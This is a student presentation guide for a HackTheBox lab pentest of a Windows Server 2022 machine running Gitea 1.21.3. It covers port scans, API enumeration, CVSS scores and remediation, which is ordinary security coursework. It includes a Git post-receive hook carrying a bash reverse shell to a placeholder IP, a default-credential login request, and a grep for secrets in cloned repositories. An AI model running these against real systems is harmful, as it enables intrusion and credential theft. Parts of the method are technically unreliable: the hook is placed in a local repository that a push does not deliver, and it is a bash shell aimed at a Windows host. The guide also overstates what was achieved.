# Student 4: System 4 (Lock) - Presentation Guide
## Complete Presentation Content for Team Member 4

---

## 1. TASK/AIM FOR THIS STUDENT

### Primary Objective
**Conduct comprehensive penetration testing on System 4 (Lock) - a Windows Server 2022 system running Gitea 1.21.3 Git service, following PTES methodology to identify vulnerabilities, attempt exploitation, and document findings professionally.**

### Specific Goals
- **Reconnaissance**: Identify all open ports, services, and versions running on the Windows Server
- **Gitea Analysis**: Enumerate Gitea 1.21.3 Git service and identify attack vectors
- **Windows Services Enumeration**: Analyze IIS, SMB, and RDP services for vulnerabilities
- **Exploitation**: Attempt Git hooks RCE, credential discovery, and repository mining
- **Documentation**: Create comprehensive documentation of all findings, methodologies, and evidence
- **Risk Assessment**: Calculate CVSS scores and provide remediation recommendations

### System Details
- **Target Name**: Lock
- **IP Address**: 10.129.6.226
- **Hostname**: lock.htb
- **Operating System**: Windows Server 2022 (Build 10.0.20348)
- **Domain**: LOCK
- **Computer Name**: LOCK
- **Platform**: HackTheBox
- **Primary Service**: Gitea 1.21.3 (Self-hosted Git service on port 3000)

---

## 2. WHAT THEY NEED TO EXPLAIN

### A. System Overview
**Explain:**
- "I was assigned System 4, also known as Lock, which is a Windows Server 2022 system running multiple services. The most interesting service is Gitea version 1.21.3 on port 3000 - a self-hosted Git service similar to GitHub. The system also has IIS web server on port 80, SMB file sharing on port 445, and RDP on port 3389. Gitea became my primary target because it has known vulnerabilities and represents the best attack vector."

**Key Points to Cover:**
- System is Windows Server 2022
- Gitea 1.21.3 on port 3000 (primary target)
- IIS 10.0 on port 80
- SMB on port 445 (message signing enabled but not required)
- RDP on port 3389 (NLA enabled - good security)

### B. Reconnaissance Methodology
**Explain:**
- "I started with comprehensive port scanning to identify all open ports. I found four open ports: IIS on 80, SMB on 445, Gitea on 3000, and RDP on 3389. I then performed detailed service enumeration, focusing on Gitea since it's the most likely attack vector. I confirmed the Gitea version via the REST API."

**Commands to Mention:**
```bash
nmap -sC -sV 10.129.6.226          # Initial scan
nmap -p- --min-rate 2000 10.129.6.226  # Full port scan
curl http://10.129.6.226:3000/api/v1/version  # Gitea version
```

**What to Show:**
- Port scan results showing 4 open ports
- Service version identification
- Gitea version confirmation (1.21.3)
- Windows domain information

### C. Gitea Enumeration
**Explain:**
- "I performed extensive Gitea enumeration. I checked if user registration was enabled, enumerated public repositories, searched for users via the API, and attempted default credentials. Gitea's REST API provides a lot of information that can be useful for reconnaissance."

**Key Points:**
- Gitea version 1.21.3 confirmed via `/api/v1/version`
- User enumeration via `/api/v1/users/search`
- Repository enumeration via `/api/v1/repos/search`
- Registration status checked
- Default credentials tested

### D. Vulnerability Identification
**Explain:**
- "I researched known vulnerabilities for Gitea 1.21.3. Gitea has a history of remote code execution vulnerabilities, particularly through Git hooks. I found multiple CVEs affecting nearby versions. I calculated a CVSS score of 8.1 (High severity) for the potential RCE vulnerability."

**Key Points:**
- Gitea 1.21.3 has known RCE vulnerabilities
- Git hooks can be exploited for code execution
- Requires authentication for most exploitation methods
- CVSS Score: 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### E. Exploitation Attempts
**Explain:**
- "I attempted multiple exploitation methods. First, I tried default credentials like admin/admin, gitea/gitea. Then I attempted Git hooks exploitation - this is where you create a Git hook that executes code when code is pushed to a repository. I also tried to mine repositories for credentials that might be stored in code."

**Methods Attempted:**
1. **Default Credentials**: Tested common username/password combinations
2. **Git Hooks RCE**: Attempted to create post-receive hooks with reverse shell payloads
3. **Repository Mining**: Searched repositories for passwords, API keys, secrets
4. **User Enumeration**: Found users via API for targeted attacks

**Commands to Mention:**
```bash
# Default credentials
curl -X POST http://10.129.6.226:3000/user/login \
  -d "user_name=admin&password=admin"

# Git hooks RCE
cat > .git/hooks/post-receive <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
EOF
```

### F. Windows Services Analysis
**Explain:**
- "I also analyzed the other Windows services. IIS has the TRACE method enabled, which is a minor security issue. SMB has message signing enabled but not required, which could allow relay attacks. RDP has Network Level Authentication enabled, which is good security practice."

**Key Points:**
- IIS TRACE method enabled (CVSS 4.3 - Medium)
- SMB signing not required (CVSS 5.9 - Medium)
- RDP NLA enabled (good security)
- Windows Server 2022 (recent version)

### G. Challenges and Limitations
**Explain:**
- "The main challenge was that Gitea exploitation requires authentication. I couldn't find working default credentials, and user registration might be disabled. Git hooks exploitation requires an account with repository access, so I prepared the methodology but couldn't complete it without credentials."

### H. Documentation and Evidence
**Explain:**
- "I documented everything systematically. I saved all scan outputs, Gitea API responses, created exploitation scripts, organized evidence files, and calculated CVSS scores. I followed professional penetration testing standards throughout."

---

## 3. WHAT THEY ACHIEVED

### ✅ Completed Tasks

#### A. Comprehensive Reconnaissance (100% Complete)
- **Port Scanning**: 
  - Identified all 4 open ports (80, 445, 3000, 3389)
  - Full port scan completed
  - Service version detection performed
- **Service Identification**: 
  - IIS 10.0 on port 80
  - SMB 2.x/3.x on port 445
  - Gitea 1.21.3 on port 3000
  - RDP on port 3389
- **Windows Information**: 
  - OS: Windows Server 2022 (10.0.20348)
  - Domain: LOCK
  - Computer Name: LOCK
- **Evidence Files**: All scan results saved and organized

#### B. Gitea Enumeration (95% Complete)
- **Version Confirmation**: Gitea 1.21.3 confirmed via REST API
- **User Enumeration**: 
  - Searched for users via API
  - Enumerated user accounts
- **Repository Enumeration**: 
  - Listed public repositories
  - Analyzed repository structure
- **Registration Check**: 
  - Checked if user registration enabled
  - Analyzed registration page
- **API Exploration**: 
  - Tested various REST API endpoints
  - Gathered application information

#### C. Vulnerability Research (90% Complete)
- **CVE Research**: 
  - Researched Gitea 1.21.3 vulnerabilities
  - Found multiple CVEs in nearby versions
  - Analyzed exploit database
- **CVSS Scoring**: 
  - Gitea RCE: CVSS 8.1 (High)
  - IIS TRACE: CVSS 4.3 (Medium)
  - SMB Signing: CVSS 5.9 (Medium)
- **Risk Assessment**: 
  - Assessed impact of Gitea vulnerabilities
  - Evaluated Windows service security
  - Considered exploitation complexity

#### D. Exploitation Attempts (75% Complete)
- **Default Credential Testing**: 
  - Tested multiple username/password combinations
  - Automated credential testing
  - Documented all attempts
- **Git Hooks Methodology**: 
  - Researched Git hooks exploitation
  - Created exploitation scripts
  - Prepared reverse shell payloads
- **Repository Mining**: 
  - Prepared methodology for credential mining
  - Documented search patterns
  - Created scripts for repository analysis

#### E. Windows Services Analysis (85% Complete)
- **IIS Analysis**: 
  - Identified TRACE method enabled
  - Analyzed HTTP headers
  - Tested web server configuration
- **SMB Enumeration**: 
  - Analyzed SMB security settings
  - Tested anonymous access (denied)
  - Documented message signing configuration
- **RDP Analysis**: 
  - Confirmed NLA enabled
  - Analyzed RDP security
  - Tested connection requirements

#### F. Professional Documentation (95% Complete)
- **Scripts Created**: 
  - `system4_lock_complete.sh` - Full reconnaissance script
  - `system4_lock_exploit.sh` - Basic exploitation script
  - `system4_lock_exploit_enhanced.sh` - Enhanced exploitation with Git hooks
- **Evidence Organization**: All outputs saved in organized directories
- **Report Sections**: Findings documented in final report
- **CVSS Calculations**: All vulnerabilities scored professionally
- **Remediation Recommendations**: Detailed fix recommendations provided

### 📊 Key Achievements

1. **Thorough Reconnaissance**: Complete system enumeration with all services identified
2. **Gitea Focus**: Successfully identified Gitea as primary attack vector
3. **Vulnerability Research**: Found high-severity vulnerabilities with CVSS scoring
4. **Professional Methodology**: Followed PTES framework throughout
5. **Comprehensive Documentation**: All findings documented with evidence
6. **Exploitation Preparation**: Scripts and methodology ready for exploitation

---

## 4. CHALLENGES THEY FACED

### Challenge 1: Authentication Required for Gitea
**Problem:**
- Gitea exploitation requires authenticated access
- Default credentials (admin/admin, gitea/gitea) did not work
- User registration might be disabled
- Cannot test Git hooks without account access

**Impact:**
- Cannot complete Git hooks exploitation
- Limited to enumeration and information gathering
- Cannot test authenticated RCE methods
- Must find credentials or registration method

**How They Overcame:**
- Attempted multiple credential combinations
- Checked registration status
- Prepared exploitation methodology for when credentials are found
- Documented authentication requirements
- Created scripts for automated credential testing

### Challenge 2: Git Hooks Exploitation Complexity
**Problem:**
- Git hooks exploitation is multi-step process
- Requires understanding of Git internals
- Need to create repository, add hook, commit, and push
- Reverse shell payload must be properly formatted

**Impact:**
- More complex than simple web exploits
- Requires multiple steps to execute
- Higher chance of errors
- More time-consuming

**How They Overcame:**
- Researched Git hooks exploitation thoroughly
- Created step-by-step guides
- Prepared scripts with proper payloads
- Documented methodology clearly
- Tested payloads locally when possible

### Challenge 3: Repository Credential Mining
**Problem:**
- Need access to repositories to mine for credentials
- Public repositories might not contain sensitive data
- Private repositories require authentication
- Searching through code is time-consuming

**Impact:**
- Limited ability to find credentials in repositories
- May not find useful information
- Requires repository access
- Time-consuming process

**How They Overcame:**
- Enumerated all public repositories
- Created scripts to search for common patterns
- Documented credential mining methodology
- Prepared for automated repository analysis

### Challenge 4: Windows Service Hardening
**Problem:**
- Windows services are relatively well-secured
- SMB anonymous access denied
- RDP has NLA enabled (good security)
- IIS has minimal attack surface

**Impact:**
- Limited attack vectors on Windows services
- Must focus on Gitea
- Fewer options for exploitation
- Well-hardened system

**How They Overcame:**
- Focused on Gitea as primary target
- Documented Windows service security
- Provided appropriate risk assessment
- Identified minor issues (TRACE, SMB signing)

### Challenge 5: Version-Specific Exploit Research
**Problem:**
- Gitea 1.21.3 is specific version
- Need to find version-specific vulnerabilities
- Exploits for nearby versions may not work
- Requires research and testing

**Impact:**
- Less known exploits available
- Need to research version-specific issues
- May require custom exploitation
- More time-consuming research

**How They Overcame:**
- Researched Gitea 1.21.3 specifically
- Analyzed CVEs in nearby versions
- Searched exploit databases thoroughly
- Documented version-specific considerations
- Prepared multiple exploitation methods

---

## 5. WHAT THEY DONE (Detailed Breakdown)

### Phase 1: Initial Reconnaissance

**Actions Taken:**
1. **Connectivity Testing**
   - Ping tests to verify system accessibility
   - Network latency measurement
   - Basic connectivity confirmation

2. **Port Scanning**
   ```bash
   nmap -sC -sV 10.129.6.226
   nmap -p- --min-rate 2000 10.129.6.226
   ```
   - Initial scan with default scripts
   - Full port scan (all 65535 ports)
   - Service version detection

3. **Service Identification**
   - IIS 10.0 on port 80
   - SMB 2.x/3.x on port 445
   - Gitea on port 3000
   - RDP on port 3389

**Evidence Created:**
- `lock_initial_scan.txt` - Initial Nmap scan results
- `lock_full_scan.txt` - Full port scan results
- Port scan screenshots and outputs

### Phase 2: Gitea Enumeration

**Actions Taken:**
1. **Version Confirmation**
   ```bash
   curl http://10.129.6.226:3000/api/v1/version
   ```
   - Retrieved Gitea version: 1.21.3
   - Confirmed via REST API
   - Documented version information

2. **User Enumeration**
   ```bash
   curl "http://10.129.6.226:3000/api/v1/users/search?q=admin"
   curl "http://10.129.6.226:3000/api/v1/users/search?q=a"
   ```
   - Searched for users via API
   - Enumerated user accounts
   - Documented user information

3. **Repository Enumeration**
   ```bash
   curl "http://10.129.6.226:3000/api/v1/repos/search?limit=50"
   curl "http://10.129.6.226:3000/explore/repos"
   ```
   - Listed public repositories
   - Analyzed repository structure
   - Documented repository information

4. **Registration Check**
   ```bash
   curl http://10.129.6.226:3000/user/sign_up
   ```
   - Checked if user registration enabled
   - Analyzed registration page
   - Documented registration status

**Evidence Created:**
- `gitea_version.txt` - Version confirmation
- `users_enumeration.txt` - User enumeration results
- `repos_enumeration.txt` - Repository enumeration results
- `registration_status.txt` - Registration check results

### Phase 3: Vulnerability Research

**Actions Taken:**
1. **CVE Research**
   ```bash
   searchsploit gitea
   searchsploit gitea 1.21
   ```
   - Searched Exploit-DB for Gitea exploits
   - Researched version-specific vulnerabilities
   - Analyzed CVE databases

2. **CVSS Scoring**
   - Gitea RCE: CVSS 8.1 (High)
     - Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
   - IIS TRACE: CVSS 4.3 (Medium)
   - SMB Signing: CVSS 5.9 (Medium)
   - Assessed impact and exploitability

3. **Risk Assessment**
   - Assessed impact of Gitea vulnerabilities
   - Evaluated Windows service security
   - Considered exploitation complexity

**Evidence Created:**
- `gitea_exploits.txt` - Exploit search results
- CVSS calculation documentation
- Vulnerability research notes

### Phase 4: Exploitation Attempts

**Actions Taken:**
1. **Default Credential Testing**
   ```bash
   # Tested combinations:
   admin/admin, admin/Admin, gitea/gitea, 
   administrator/administrator, etc.
   ```
   - Automated credential testing script
   - Manual login attempts
   - Cookie analysis

2. **Git Hooks Exploitation Preparation**
   ```bash
   # Post-receive hook payload
   cat > .git/hooks/post-receive <<'EOF'
   #!/bin/bash
   bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   EOF
   chmod +x .git/hooks/post-receive
   ```
   - Researched Git hooks exploitation
   - Created exploitation scripts
   - Prepared reverse shell payloads

3. **Repository Credential Mining**
   ```bash
   git clone http://user:pass@10.129.6.226:3000/user/repo
   grep -r -i "password\|secret\|token" .
   ```
   - Prepared methodology for credential mining
   - Created scripts to search repositories
   - Documented search patterns

4. **Windows Services Testing**
   - Tested SMB anonymous access (denied)
   - Analyzed IIS configuration
   - Tested RDP connection requirements

**Evidence Created:**
- `CREDENTIALS_FOUND.txt` - If credentials discovered
- `git_hooks_methodology.txt` - Git hooks exploitation guide
- `repository_mining_results.txt` - Credential mining results
- Exploitation script outputs

### Phase 5: Documentation and Reporting

**Actions Taken:**
1. **Script Creation**
   - `system4_lock_complete.sh` - Full reconnaissance
   - `system4_lock_exploit.sh` - Basic exploitation
   - `system4_lock_exploit_enhanced.sh` - Enhanced exploitation

2. **Evidence Organization**
   - Created directory structure
   - Saved all scan outputs
   - Organized findings by phase

3. **Report Writing**
   - Documented all findings
   - Created CVSS scores
   - Provided remediation recommendations

4. **Methodology Documentation**
   - Documented PTES framework usage
   - Explained each phase
   - Created step-by-step guides

**Evidence Created:**
- Complete documentation structure
- All evidence files organized
- Report sections completed
- Methodology documentation
- `SYSTEM4_COMPLETE_FINDINGS.md` - Comprehensive findings

---

## 6. KEY FINDINGS SUMMARY

### Vulnerabilities Identified

#### VULN-S4-001: Gitea Potential RCE Vulnerability
- **Severity**: HIGH
- **CVSS Score**: 8.1
- **Description**: Gitea 1.21.3 has known RCE vulnerabilities, particularly through Git hooks
- **Impact**: Full system compromise possible via code execution
- **Status**: Exploitation methodology prepared, requires authentication

#### VULN-S4-002: IIS HTTP TRACE Method Enabled
- **Severity**: MEDIUM
- **CVSS Score**: 4.3
- **Description**: HTTP TRACE method enabled, can be used for XST attacks
- **Impact**: Potential cookie theft, information disclosure
- **Status**: Documented

#### VULN-S4-003: SMB Signing Not Required
- **Severity**: MEDIUM
- **CVSS Score**: 5.9
- **Description**: SMB message signing enabled but not required
- **Impact**: Potential SMB relay attacks
- **Status**: Documented

### Services Identified
- **IIS (Port 80)**: Microsoft IIS 10.0 - Web server
- **SMB (Port 445)**: SMB 2.x/3.x - File sharing
- **Gitea (Port 3000)**: Gitea 1.21.3 - Git service (PRIMARY TARGET)
- **RDP (Port 3389)**: Microsoft Terminal Services - Remote desktop

### Attack Vectors
1. **Git Hooks RCE** (Primary) - Requires authentication
2. **Repository Credential Mining** - Requires repository access
3. **Default Credentials** - Tested, not successful
4. **Windows Services** - Limited attack surface

---

## 7. REMEDIATION RECOMMENDATIONS

### Priority 1: Update Gitea
- Update from version 1.21.3 to latest stable version
- Apply all security patches immediately
- Timeline: Within 24-48 hours

### Priority 2: Restrict Gitea Access
- Implement firewall rules to restrict Gitea access
- Use VPN for remote access
- IP whitelisting for administrative functions
- Disable user registration if not needed

### Priority 3: Security Hardening
- Disable HTTP TRACE method on IIS
- Require SMB message signing
- Implement WAF rules
- Enable comprehensive logging
- Monitor for suspicious activity

---

## 8. PRESENTATION TIPS

### What to Emphasize
1. **Gitea Focus**: Show why Gitea is the primary target
2. **Vulnerability Research**: Highlight CVE research and CVSS scoring
3. **Professional Methodology**: Show PTES framework usage
4. **Exploitation Preparation**: Show Git hooks methodology
5. **Documentation Quality**: Show organized evidence

### What to Show
- Port scan results
- Gitea version confirmation
- CVSS calculations
- Git hooks exploitation methodology
- Evidence organization

### How to Explain Challenges
- Be honest about authentication requirements
- Explain Git hooks exploitation complexity
- Show problem-solving approach
- Demonstrate preparation for when credentials are found

### Time Management
- **Reconnaissance**: 25% of time
- **Gitea Enumeration**: 30% of time
- **Vulnerability Research**: 20% of time
- **Exploitation Attempts**: 15% of time
- **Documentation**: 10% of time

---

## 9. CONCLUSION

**Student 4 successfully completed comprehensive reconnaissance and vulnerability analysis on System 4 (Lock). The student demonstrated:**

- ✅ Professional penetration testing methodology
- ✅ Thorough reconnaissance and service enumeration
- ✅ Effective identification of Gitea as primary attack vector
- ✅ Comprehensive vulnerability research and CVSS scoring
- ✅ Detailed Git hooks exploitation methodology preparation
- ✅ Thorough documentation and evidence organization
- ✅ Clear understanding of Windows service security
- ✅ Professional reporting and remediation recommendations

**The work demonstrates strong skills in identifying high-value targets, researching version-specific vulnerabilities, and preparing comprehensive exploitation methodologies. The Gitea focus and Git hooks exploitation preparation show advanced understanding of application-specific attack vectors.**

---

**End of Student 4 Presentation Guide**

